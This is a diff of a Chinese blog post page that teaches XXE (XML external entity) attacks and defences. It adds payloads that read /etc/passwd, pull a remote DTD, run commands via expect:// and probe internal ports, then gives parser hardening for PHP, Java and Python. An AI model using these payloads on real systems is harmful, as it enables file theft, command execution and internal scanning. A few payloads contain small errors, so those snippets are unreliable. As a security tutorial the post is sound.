@@ -106,11 +106,15 @@
 <meta property="og:site_name" content="Hello_C技术博客">
 <meta property="og:description" content="0x01 XXE　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。
 0x02 XML　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）">
-<meta property="og:updated_time" content="2017-06-30T02:44:27.797Z">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-6-30/57454021.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-6-30/56162947.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-6-30/80284871.jpg">
+<meta property="og:updated_time" content="2017-06-30T04:22:12.595Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE漏洞攻防">
 <meta name="twitter:description" content="0x01 XXE　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。
 0x02 XML　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）">
+<meta name="twitter:image" content="http://obh1qcqek.bkt.clouddn.com/17-6-30/57454021.jpg">
 
 
 
@@ -430,7 +434,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  416 字
+                  936 字
                 </span>
               
 
@@ -446,7 +450,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  4 分钟
                 </span>
               
             </div>
@@ -475,7 +479,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>　　DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p>　　DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值，可以内部声明或外部引用。实体按类型主要分为以下四种：</p>
+<blockquote>
+<p>内置实体 (Built-in entities)<br>字符实体 (Character entities)<br>通用实体 (General entities)<br>参数实体 (Parameter entities)</p>
+</blockquote>
 <ul>
 <li><p>内部声明实体</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</div></pre></td></tr></table></figure>
@@ -483,8 +490,48 @@
 <li><p>引用外部实体</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
 </li>
+<li><p>参数实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
+</li>
 </ul>
-<h3 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h3><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a></p>
+<h3 id="0x03-XML外部实体注入"><a href="#0x03-XML外部实体注入" class="headerlink" title="0x03 XML外部实体注入"></a>0x03 XML外部实体注入</h3><p>　　当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<ul>
+<li><p>恶意引用外部实体方式1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>恶意引用外部实体方式2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY % b SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">  %b;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>恶意引用外部实体方式3<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY a SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>不同的程序支持不同的协议:<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/57454021.jpg" alt=""><br>另外PHP还支持一些扩展协议：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/56162947.jpg" alt=""></p>
+<blockquote>
+<p>XXE危害：读取任意文件<br>由于采用的centos的系统，一些效果可能没有出来，但是思路是没有错的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml = &lt;&lt;&lt; EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&gt;]&gt;    </div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>XXE危害：执行系统命令</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/80284871.jpg" alt=""></p>
+<blockquote>
+<p>探测内网端口</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.121:80/web1/&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>XXE危害：攻击内网网站</p>
+</blockquote>
+<h3 id="0x04-XXE防御"><a href="#0x04-XXE防御" class="headerlink" title="0x04 XXE防御"></a>0x04 XXE防御</h3><ul>
+<li><p>使用开发语言提供的禁用外部实体的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
+</li>
+<li><p>过滤用户提交的XML数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>参考链接：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br>        <a href="http://thief.one/2017/06/20/1/" target="_blank" rel="external">http://thief.one/2017/06/20/1/</a></p>
 
       
     </div>
@@ -791,7 +838,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-XXE"><span class="nav-number">1.</span> <span class="nav-text">0x01 XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-XML"><span class="nav-number">2.</span> <span class="nav-text">0x02 XML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML外部实体注入"><span class="nav-number">3.</span> <span class="nav-text">XML外部实体注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-XXE"><span class="nav-number">1.</span> <span class="nav-text">0x01 XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-XML"><span class="nav-number">2.</span> <span class="nav-text">0x02 XML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-XML外部实体注入"><span class="nav-number">3.</span> <span class="nav-text">0x03 XML外部实体注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-XXE防御"><span class="nav-number">4.</span> <span class="nav-text">0x04 XXE防御</span></a></li></ol></div>
             
 
           </div>
